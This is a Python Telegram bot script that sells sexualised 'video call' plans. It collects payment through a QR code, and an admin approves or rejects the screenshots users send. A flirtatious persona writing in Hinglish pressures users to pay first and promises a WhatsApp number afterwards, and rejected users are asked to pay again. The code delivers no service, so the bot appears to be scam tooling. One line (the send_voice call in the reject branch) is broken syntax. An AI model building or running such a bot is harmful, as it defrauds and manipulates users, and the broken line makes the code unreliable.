from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ConversationHandler, ContextTypes
)
import os, json, time

# --- CONFIG ---
ADMIN_ID = 8310700441
TOKEN = os.getenv("BOT_TOKEN")

QR_FILE_ID = "AgACAgUAAxkBAAIBXmpR9KfCaoBPQGCf6__yKGftuAQPAAIcF2sb4VyRVjreUTcE5T58AQADAgADeQADPAQ"
VOICE_ID = "AwACAgUAAxkBAAIBXGpR9JRt1KKh6KJ120NGB03Mf5tKAAJvIQAC4CD4VPDBIV_k516xPAQ"

PLAN_SELECTION, PAYMENT_SENDING = range(2)

# --- LOAD USERS ---
try:
    with open("paid_users.json", "r") as f:
        PAID_USERS = set(json.load(f))
except:
    PAID_USERS = set()

LAST_SENT = {}
CHAT_REPLY_COOLDOWN = {}

def save_users():
    with open("paid_users.json", "w") as f:
        json.dump(list(PAID_USERS), f)

# --- START ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.chat_id

    if user_id in PAID_USERS:
        await update.message.reply_text("✅ Welcome back! Access granted.")
        return

    keyboard = [
        [InlineKeyboardButton("📞 Demo - ₹20", callback_data='pay_20')],
        [InlineKeyboardButton("📞 5 Min - ₹50", callback_data='pay_50')],
        [InlineKeyboardButton("📞 10 Min - ₹100", callback_data='pay_100')],
        [InlineKeyboardButton("📞 20 Min - ₹200", callback_data='pay_200')],
        [InlineKeyboardButton("📞 30 Min - ₹300", callback_data='pay_300')],
    ]

    await update.message.reply_voice(voice=VOICE_ID)

    await update.message.reply_text(
        "📞 Select your Video Call Plan:\n\nFull open enjoy 💋🫦",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

    return PLAN_SELECTION

# --- PLAN CLICK ---
async def show_qr(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    data = query.data

    if data == "pay_20":
        await query.message.reply_voice(voice=VOICE_ID)

    await query.message.reply_photo(
        photo=QR_FILE_ID,
        caption="💳 Payment karo aur screenshot bhejo"
    )

    return PAYMENT_SENDING

# --- PAYMENT ---
async def handle_payment(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.chat_id

    await context.bot.forward_message(
        chat_id=ADMIN_ID,
        from_chat_id=user_id,
        message_id=update.message.message_id
    )

    keyboard = [[
        InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}"),
        InlineKeyboardButton("❌ Reject", callback_data=f"reject_{user_id}")
    ]]

    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"💰 Payment from {update.message.from_user.first_name}",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

    await update.message.reply_text("⏳ Payment under review...")

    return PAYMENT_SENDING

# --- ADMIN ---
async def admin_response(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    data = query.data
    user_id = int(data.split("_")[1])

    if data.startswith("approve"):
        PAID_USERS.add(user_id)
        save_users()

        await context.bot.send_message(
            chat_id=user_id,
            text="✅ Payment verified! Enjoy 💋"
        )
        await query.edit_message_text("✅ Approved")

    else:
        if user_id in PAID_USERS:
            PAID_USERS.remove(user_id)
            save_users()

        await context.bot.send_voice 'AwACAgUAAxkBAAIBYGpR9PWgrbo_7hDMtosZqAolfeJKAAJzIQAC4CD4VJ0O2PDKNJc6PAQ'

        await context.bot.send_photo(
            chat_id=user_id,
            photo=QR_FILE_ID,
            caption="❌ Payment failed.\n\n💳 Please payment karo aur screenshot bhejo baby."
        )

        keyboard = [
            [InlineKeyboardButton("📞 Demo - ₹20", callback_data='pay_20')],
            [InlineKeyboardButton("📞 5 Min - ₹50", callback_data='pay_50')],
            [InlineKeyboardButton("📞 10 Min - ₹100", callback_data='pay_100')],
            [InlineKeyboardButton("📞 20 Min - ₹200", callback_data='pay_200')],
            [InlineKeyboardButton("📞 30 Min - ₹300", callback_data='pay_300')],
        ]

        await context.bot.send_message(
            chat_id=user_id,
            text="📞 Select your plan again:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

        await query.edit_message_text("❌ Rejected")

# --- SMART REPLY ---
async def smart_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message:
        return

    user_id = update.message.chat_id
    text = update.message.text.lower()

    if user_id in PAID_USERS:
        return

    keywords = ["video", "kab", "kaha", "call", "kaise"]

    if any(word in text for word in keywords):
        now = time.time()

        if user_id in CHAT_REPLY_COOLDOWN and now - CHAT_REPLY_COOLDOWN[user_id] < 15:
            return

        CHAT_REPLY_COOLDOWN[user_id] = now

        await update.message.reply_text(
            "😘 Baby sab milega... pehle payment karo 💋\n\nPayment ke baad main mere WhatsApp number dungi baby❤️"
        )

        await update.message.reply_photo(
            photo=QR_FILE_ID,
            caption="💳 Jaldi payment karo 😘 Bina payment ke raply nhi milega"
        )

# --- FORCE PAYMENT ---
async def force_payment(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message:
        return

    user_id = update.message.chat_id

    if user_id not in PAID_USERS:
        now = time.time()

        if user_id in LAST_SENT and now - LAST_SENT[user_id] < 10:
            return

        LAST_SENT[user_id] = now

        await update.message.reply_text(
            "⚠️ Access ke liye pehle payment karein."
        )

        await update.message.reply_photo(
            photo=QR_FILE_ID,
            caption="💳 Payment karke screenshot bhejein."
        )

# --- MAIN ---
def main():
    app = ApplicationBuilder().token(TOKEN).build()

    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            PLAN_SELECTION: [
                CallbackQueryHandler(show_qr, pattern='^pay_')
            ],
            PAYMENT_SENDING: [
                MessageHandler(filters.PHOTO | filters.TEXT, handle_payment)
            ],
        },
        fallbacks=[CommandHandler("start", start)]
    )

    app.add_handler(conv)
    app.add_handler(CallbackQueryHandler(admin_response, pattern='^(approve|reject)_'))

    # SMART reply first
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, smart_reply))

    # FORCE payment last
    app.add_handler(MessageHandler(filters.ALL, force_payment))

    print("Bot running...")
    app.run_polling()

if __name__ == "__main__":
    main()
